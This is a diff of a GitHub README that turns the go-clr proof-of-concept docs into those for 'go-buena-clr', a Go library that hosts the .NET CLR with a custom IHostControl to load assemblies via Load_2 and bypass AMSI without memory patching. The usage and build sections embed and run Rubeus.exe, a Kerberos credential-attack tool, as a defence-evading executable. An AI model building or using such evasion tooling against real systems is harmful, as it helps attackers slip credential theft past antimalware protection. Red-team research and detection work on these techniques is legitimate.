@@ -1,69 +1,76 @@
-# go-clr
-[![GoDoc](https://godoc.org/github.com/ropnop/go-clr?status.svg)](https://godoc.org/github.com/ropnop/go-clr)
+# go-buena-clr
 
-This is my PoC code for hosting the CLR in a Go process and using it to execute a DLL from disk or an assembly from memory.
+![go-buena-clr](go-buena-clr.png)
 
-It's written in pure Go by just wrapping the needed syscalls and making use of a lot of unsafe.Pointers to 
-load structs from memory.
+go-buena-clr CLR is the implementation in Go of [Being a Good CLR Host](https://github.com/passthehashbrowns/Being-A-Good-CLR-Host) by Joshua Magri from IBM X-Force Red.
 
-For more info and references, see [this blog post](https://blog.ropnop.com/hosting-clr-in-golang/).
+It is built upon the [go-clr](https://github.com/Ne0nd0g/go-clr) project of Ne0nd0g, who in turn forked and maintained the original poc of [go-clr](https://github.com/ropnop/go-clr) by ropnop.
 
-This was was a fun project and proof of concept, but the code is definitely not "production ready". It makes heavy use 
-of `unsafe` and it's probably very unstable. I don't plan on supporting it much moving forward,
-but I wanted to share the code and knowledge to enable others to either contribute, or fork and make their own awesome tools.
+The purpose is to create our own `IHostControl` interface allowing us to implement the `ProvideAssembly` method. We can then use `Load_2` method instead of `Load_3`, circumventing AMSI entirely.
 
-## Installation and Usage
-`go-clr` is intended to be used as a package in other scripts. Install it with:
-```bash
-go get github.com/ropnop/go-clr
-```
 
-Take a look at the [examples](./examples) folder for some examples on how to leverage it. The package exposes all the structs and methods
-necessary to customize, but it also includes two "magic" functions to execute .NET from Go: `ExecuteDLLFromDisk` and
-`ExecuteByteArray`. Here's a quick example of using both:
+## Usage
+
+Just import the package and use it !
 
 ```go
-package main
-
 import (
-	clr "github.com/ropnop/go-clr"
-	"log"
-	"fmt"
-	"io/ioutil"
-	"runtime"
+	clr "github.com/almounah/go-buena-clr"
 )
 
+//go:embed Rubeus.exe
+var testNet []byte
+
 func main() {
-	fmt.Println("[+] Loading DLL from Disk")
-	ret, err := clr.ExecuteDLLFromDisk(
-		"TestDLL.dll",
-		"TestDLL.HelloWorld",
-		"SayHello",
-		"foobar")
-	if err != nil {
-		log.Fatal(err)
-	}
-	fmt.Printf("[+] DLL Return Code: %d\n", ret)
+    params := []string{"triage"}
 
-	
-	fmt.Println("[+] Executing EXE from memory")
-	exebytes, err := ioutil.ReadFile("helloworld.exe")
-	if err != nil {
-		log.Fatal(err)
-	}
-	runtime.KeepAlive(exebytes)
+    // Load the Good CLR and get the identity string from the .Net
+	pRuntimeHost, identityString, _ := clr.LoadGoodClr("v4.0.30319", testNet)
 
-	ret2, err := clr.ExecuteByteArray(exebytes)
-	if err != nil {
-		log.Fatal(err)
-	}
-	fmt.Printf("[+] EXE Return Code: %d\n", ret2)
+    // Load the Assembly via its identityString
+	assembly := clr.Load2Assembly(pRuntimeHost, identityString)
+
+    // Invoke the Assembly
+	pMethodInfo, _ := assembly.GetEntryPoint()
+	clr.InvokeAssembly(pMethodInfo, params)
 }
-``` 
+```
 
-The other 2 examples show the same technique but without the magic functions.
+## Examples - Buena Village
 
-### License
-This project is licensed under the [Do What the Fuck You Want to Public License](http://www.wtfpl.net/). I deliberately
-chose this "joke" license because I really don't think anyone should be using this for anything serious, and I know
-some organizations forbid this license from being used in products (which is a good thing).
+Buena Village is a small POC project that showcase go-buena-clr in action. You can check `examples/BuenaVillage/` for a README and the complete code. 
+
+Basically you do:
+
+```bash
+cd examples/BuenaVillage
+go mod tidy
+go run helper/helper.go -file=/home/kali/Desktop/Rubeus.exe && GOOS=windows GOARCH=amd64 go build
+```
+
+You will get a `buenavillage.exe` that you can use like `Rubeus.exe` whith native AMSI bypass without memory patching:
+
+```powershell
+.\buenavillage.exe triage
+.\buenavillage.exe -help
+```
+
+## Motivation of Buena CLR
+
+Basically we all noticed that a while ago, defender introduced behavioral rules to prevent AMSI memory patching.
+
+Thanks to IBM X-Force Red, we got a patchless AMSI bypass that does not rely on the CPU like for Hardware Break Point !!
+
+## Contributions
+
+All contributions are welcome :)
+
+## Side Story: Why the name go-buena-clr
+
+In [Mushoku Tensei](https://myanimelist.net/anime/39535/Mushoku_Tensei__Isekai_Ittara_Honki_Dasu) buena village is the village where Rudeus Greyrat spent his childhood. As the name suggest, buena (good in spanish) village, was a good place for Rudeus to restart his life.
+
+I named this project go-buena-clr as it is a good and warm CLR host for Rubeus.exe without AMSI, much like buena village was a good and warm place for Rudeus.
+
+## License
+
+To continue ropnop legacy this project is still licensed under the [Do What the Fuck You Want to Public License](http://www.wtfpl.net/). 
